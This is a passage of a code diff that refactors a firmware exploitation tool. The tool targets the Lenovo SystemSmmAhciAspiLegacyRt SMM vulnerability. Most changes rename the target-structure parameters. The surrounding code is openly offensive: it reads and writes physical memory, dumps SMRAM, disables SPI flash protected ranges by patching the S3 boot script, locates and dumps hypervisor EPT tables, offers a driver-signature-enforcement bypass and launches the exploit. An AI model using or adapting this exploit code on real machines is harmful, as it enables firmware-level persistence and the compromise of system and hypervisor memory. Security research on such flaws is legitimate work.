+        target, (void *)bootscript_addr, bootscript_size, bootscript, NULL) != 0)
     {
         printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
         goto _end;
@@ -1917,7 +1958,7 @@ int pr_disable(int target, PUEFI_EXPL_TARGET custom_target)
 
                     // patch PRx write value to zero
                     if (phys_mem_write(
-                        target, custom_target, (void *)(bootscript_addr + ptr + 0x11),
+                        target, (void *)(bootscript_addr + ptr + 0x11),
                         sizeof(unsigned int), (unsigned char *)&val, NULL) == 0)
                     {
                         entries_patched += 1;
@@ -1950,7 +1991,7 @@ int pr_disable(int target, PUEFI_EXPL_TARGET custom_target)
         if (s3_sleep_with_timeout(10) == 0)
         {
             // get current values of PRx registers
-            if (pr_get(target, custom_target, &pr0_val, &pr1_val, &pr2_val, &pr3_val, &pr4_val) != 0)
+            if (pr_get(target, &pr0_val, &pr1_val, &pr2_val, &pr3_val, &pr4_val) != 0)
             {
                 printf(__FUNCTION__"() ERROR: pr_get() fails\n");
                 goto _end;
@@ -1986,7 +2027,7 @@ _end:
 //--------------------------------------------------------------------------------------
 int _tmain(int argc, _TCHAR* argv[])
 {
-    int ret = -1, target = -1;
+    int ret = -1, target_num = -1;
     unsigned long long length, pml4_addr = 0;        
     const char *data_file = NULL;
     void *mem_read = NULL, *mem_write = NULL;
@@ -1998,9 +2039,9 @@ int _tmain(int argc, _TCHAR* argv[])
     memset(&context, 0, sizeof(context));
     context.op = SMM_OP_NONE;
 
-    UEFI_EXPL_TARGET custom_target;
-    memset(&custom_target, 0, sizeof(custom_target));
-    custom_target.smi_num = -1;    
+    UEFI_EXPL_TARGET target;
+    memset(&target, 0, sizeof(target));
+    target.smi_num = -1;    
 
     // parse command line options
     for (int i = 1; i < argc; i++)
@@ -2035,7 +2076,7 @@ int _tmain(int argc, _TCHAR* argv[])
         }
         else if (!strcmp(argv[i], "--phys-mem-write") && i < argc - 1)
         {
-            context.op = SMM_OP_PHYS_MEM_WRITE;
+            context.op = SMM_OP_MEM_WRITE;
 
             // write memory (--file option is mandatory)
             mem_write = (void *)strtoull(argv[i + 1], NULL, 16);
@@ -2092,7 +2133,7 @@ int _tmain(int argc, _TCHAR* argv[])
         else if (!strcmp(argv[i], "--target") && i < argc - 1)
         {
             // update target model number
-            target = strtoul(argv[i + 1], NULL, 16);
+            target_num = strtoul(argv[i + 1], NULL, 16);
 
             if (errno != 0)
             {
@@ -2108,7 +2149,7 @@ int _tmain(int argc, _TCHAR* argv[])
                 Address of EFI_BOOT_SERVICES.LocateProtocol field that necessary for 
                 SystemSmmAhciAspiLegacyRt vulnerability exploitation.
             */
-            custom_target.addr = strtoull(argv[i + 1], NULL, 16);
+            target.addr = strtoull(argv[i + 1], NULL, 16);
 
             if (errno != 0)
             {
@@ -2121,7 +2162,7 @@ int _tmain(int argc, _TCHAR* argv[])
         else if (!strcmp(argv[i], "--target-smi") && i < argc - 1)
         {
             // SMI handler number for SystemSmmAhciAspiLegacyRt vulnerability exploitation
-            custom_target.smi_num = strtoul(argv[i + 1], NULL, 16);
+            target.smi_num = strtoul(argv[i + 1], NULL, 16);
 
             if (errno != 0)
             {
@@ -2207,6 +2248,12 @@ int _tmain(int argc, _TCHAR* argv[])
         return -1;
     }
 
+    // initialize target model information
+    if (!expl_lenovo_SystemSmmAhciAspiLegacyRt_init(&target, target_num))
+    {
+        return -1;
+    }
+
     // initialize HAL
     if (uefi_expl_init(NULL, use_dse_bypass))
     {    
@@ -2230,17 +2277,17 @@ int _tmain(int argc, _TCHAR* argv[])
                 if (mem_read)
                 {
                     // read memory contents
-                    ret = phys_mem_read(target, &custom_target, mem_read, length, NULL, data_file);
+                    ret = phys_mem_read(&target, mem_read, length, NULL, data_file);
                 }
                 else if (mem_write)
                 {
                     // write memory contents
-                    ret = phys_mem_write(target, &custom_target, mem_write, length, NULL, data_file);
+                    ret = phys_mem_write(&target, mem_write, length, NULL, data_file);
                 }
                 else if (use_mem_dump)
                 {
                     // dump all of the memory contents to file
-                    ret = phys_mem_dump(target, &custom_target, data_file);
+                    ret = phys_mem_dump(&target, data_file);
                 }
                 else if (use_ept_find)
                 {                    
@@ -2248,7 +2295,7 @@ int _tmain(int argc, _TCHAR* argv[])
                     unsigned long long *ept = NULL, vmm_cr3 = 0;
                     
                     // find running VMX virtual machines and get their EPTP values
-                    if (ept_find(target, &custom_target, &items_found, &ept, &vmm_cr3))
+                    if (ept_find(&target, &items_found, &ept, &vmm_cr3))
                     {
                         if (vmm_cr3 != 0)
                         {
@@ -2283,24 +2330,24 @@ int _tmain(int argc, _TCHAR* argv[])
                 else if (pml4_addr != 0)
                 {
                     // dump EPT tables
-                    ret = ept_dump(target, &custom_target, pml4_addr, data_file);
+                    ret = ept_dump(&target, pml4_addr, data_file);
                 }
                 else if (use_pr_disable)
                 {
                     // disable SPI protected ranges
-                    ret = pr_disable(target, &custom_target);
+                    ret = pr_disable(target_num, &target);
                 }
                 else if (use_smram_dump)
                 {
                     unsigned long long addr = 0;
 
                     // get current SMRAM address
-                    if (addr = smram_addr(target, &custom_target))
+                    if (addr = smram_addr(&target))
                     {
                         printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);
 
                         // read SMRAM contents
-                        ret = phys_mem_read(target, &custom_target, (void *)addr, SMRAM_SIZE, NULL, data_file);
+                        ret = phys_mem_read(&target, (void *)addr, SMRAM_SIZE, NULL, data_file);
                     }
                     else
                     {
@@ -2310,7 +2357,7 @@ int _tmain(int argc, _TCHAR* argv[])
                 else
                 {                    
                     // run exploitation
-                    ret = exploit(target, &custom_target, &context, 0, false);
+                    ret = exploit(&target, &context, 0, false);
                 }
             }
             else
